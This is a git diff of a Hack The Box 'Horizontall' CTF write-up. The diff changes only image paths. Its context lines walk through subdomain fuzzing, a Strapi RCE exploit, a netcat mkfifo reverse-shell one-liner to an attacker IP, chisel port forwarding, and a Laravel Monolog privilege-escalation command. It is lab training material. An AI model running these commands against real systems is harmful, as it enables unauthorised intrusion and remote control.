@@ -26,13 +26,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 We add <mark style="color:green;">`horizontall.htb`</mark> to our <mark style="color:green;">`/etc/hosts`</mark> file since in the output we got "_Did not follow redirect to http://horizontall.htb_"
 
-![](<../../../../.gitbook/assets/image (7) (1) (1) (2).png>)
+![](<../../../.gitbook/assets/image (7) (1) (1) (2).png>)
 
 Searching on Google informs us that the latest version of <mark style="color:green;">`nginx`</mark> is 1.21.6 (mainline version) and 1.20.2 (stable version). We'll keep this in mind.
 
 Going to the site, we see a web page.
 
-![](<../../../../.gitbook/assets/image (36) (2).png>)
+![](<../../../.gitbook/assets/image (36) (2).png>)
 
 Viewing the source code and going through the site really did not provide anything useful. However, is it possible for the <mark style="color:green;">`nginx`</mark> server to have more vhosts or subdomains? Using <mark style="color:green;">`ffuf`</mark>, we will see something.
 
@@ -40,37 +40,37 @@ Viewing the source code and going through the site really did not provide anythi
 ffuf -u http://horizontall.htb -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.horizontall.htb' -fs 0 -mc 200 
 ```
 
-![api-prod subdomain](<../../../../.gitbook/assets/image (30) (1) (1).png>)
+![api-prod subdomain](<../../../.gitbook/assets/image (30) (1) (1).png>)
 
 Heading back over to the browser, we are presented with a basic welcome page.
 
-![](<../../../../.gitbook/assets/image (42) (1).png>)
+![](<../../../.gitbook/assets/image (42) (1).png>)
 
 Time to enumerate some more. Now there are two interesting directories that we can explore.
 
-![](<../../../../.gitbook/assets/image (35) (1).png>)
+![](<../../../.gitbook/assets/image (35) (1).png>)
 
 The reviews directory yields us some users: <mark style="color:green;">`wail`</mark>, <mark style="color:green;">`doe`</mark>, and <mark style="color:green;">`john`</mark>
 
-![](<../../../../.gitbook/assets/image (33) (1).png>)
+![](<../../../.gitbook/assets/image (33) (1).png>)
 
 And the admin page
 
-![](<../../../../.gitbook/assets/image (40) (1) (1).png>)
+![](<../../../.gitbook/assets/image (40) (1) (1).png>)
 
 Doing a google search on <mark style="color:green;">`strapi`</mark> shows that it is an open source Node.js headless Content Management System (CMS)
 
 Great! Now hopefully we can find a version number somewhere...
 
-![](<../../../../.gitbook/assets/image (16) (1).png>)
+![](<../../../.gitbook/assets/image (16) (1).png>)
 
 It seems the current version of is <mark style="color:green;">`Strapi 3.0.0-beta.17.4`</mark>
 
-![](<../../../../.gitbook/assets/image (37) (1).png>)
+![](<../../../.gitbook/assets/image (37) (1).png>)
 
 Using <mark style="color:green;">`searchsploit`</mark> gives us some good news. Remote Code Execution ([RCE](https://www.exploit-db.com/exploits/50239))!
 
-![](<../../../../.gitbook/assets/image (58).png>)
+![](<../../../.gitbook/assets/image (58).png>)
 
 According to [CVE-2019-18818](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-18818)
 
@@ -82,15 +82,15 @@ There's also [CVE-2019-19609](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE
 
 We run the exploit and then login
 
-![](<../../../../.gitbook/assets/image (63).png>)
+![](<../../../.gitbook/assets/image (63).png>)
 
-![](<../../../../.gitbook/assets/image (24) (1) (1).png>)
+![](<../../../.gitbook/assets/image (24) (1) (1).png>)
 
 Awesome! Now there's Plugin called "Files Upload", let's see if we can upload a file to get a reverse shell.
 
 I tried multiple times to get a shell, but the output of following the file yielded something like this:
 
-![](<../../../../.gitbook/assets/image (69) (1).png>)
+![](<../../../.gitbook/assets/image (69) (1).png>)
 
 ```
 http://localhost:1337/uploads/0083c7ac6ed14dce9cc54821af03bf08.php
@@ -104,15 +104,15 @@ As it turns out, that was a very quick solution
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.38 4444 >/tmp/f
 ```
 
-![](<../../../../.gitbook/assets/image (64) (1).png>)
+![](<../../../.gitbook/assets/image (64) (1).png>)
 
 After upgrading my shell, I searched for the user.txt file
 
-![](<../../../../.gitbook/assets/image (46) (1).png>)
+![](<../../../.gitbook/assets/image (46) (1).png>)
 
 I ran linepeas.sh and noticed something interesting. Looks like there is MySQL running and something else on port 8000. What is that port used for?
 
-![](<../../../../.gitbook/assets/image (41) (1) (1).png>)
+![](<../../../.gitbook/assets/image (41) (1) (1).png>)
 
 A Google search gave me this result
 
@@ -124,7 +124,7 @@ This most likely means we might have to do some port forwarding in order to see 
 
 Using <mark style="color:green;">`curl -v localhost:8000`</mark> gave us a site powered by Laravel AND it's version number
 
-![](<../../../../.gitbook/assets/image (65).png>)
+![](<../../../.gitbook/assets/image (65).png>)
 
 Searching for exploits I found these which were helpful
 
@@ -144,7 +144,7 @@ Now to do some port forwarding. We'll use the [chisel ](https://github.com/jpill
 
 We'll transfer it to our victim machine and make it an executable
 
-![](<../../../../.gitbook/assets/image (34).png>)
+![](<../../../.gitbook/assets/image (34).png>)
 
 Then we'll run the below commands on our kali machine and the victim machine respectively
 
@@ -153,13 +153,13 @@ Then we'll run the below commands on our kali machine and the victim machine res
 ./chisel client 10.10.14.38:7777 R:8000:127.0.0.1:8000 # on Victim
 ```
 
-![](<../../../../.gitbook/assets/image (38) (1).png>)
+![](<../../../.gitbook/assets/image (38) (1).png>)
 
-![Victim machine](<../../../../.gitbook/assets/image (5) (2).png>)
+![Victim machine](<../../../.gitbook/assets/image (5) (2).png>)
 
 Now when we go to <mark style="color:green;">`http://127.0.0.1:8000`</mark> in the browser, we can see the Laravel site
 
-![](<../../../../.gitbook/assets/image (49) (1).png>)
+![](<../../../.gitbook/assets/image (49) (1).png>)
 
 #### Priv Esc
 
@@ -169,17 +169,17 @@ Using the GitHub resource for the Laravel vulnerability, we'll execute the follo
 ./privesc.py http://localhost:8000 Monolog/RCE1 "whoami"
 ```
 
-![](<../../../../.gitbook/assets/image (67) (1) (2).png>)
+![](<../../../.gitbook/assets/image (67) (1) (2).png>)
 
 Awesome! Now we can cat the root.txt file
 
-![](<../../../../.gitbook/assets/image (59).png>)
+![](<../../../.gitbook/assets/image (59).png>)
 
 This is nice, but a shell would be nicer :)
 
-![](<../../../../.gitbook/assets/image (18) (1) (1).png>)
+![](<../../../.gitbook/assets/image (18) (1) (1).png>)
 
-![](<../../../../.gitbook/assets/image (55) (1).png>)
+![](<../../../.gitbook/assets/image (55) (1).png>)
 
 {% hint style="info" %}
 Although we get a shell, it's not very stable. But it does the job regardless
@@ -187,4 +187,4 @@ Although we get a shell, it's not very stable. But it does the job regardless
 
 SUCCESS!
 
-![](<../../../../.gitbook/assets/image (15) (1).png>)
+![](<../../../.gitbook/assets/image (15) (1).png>)
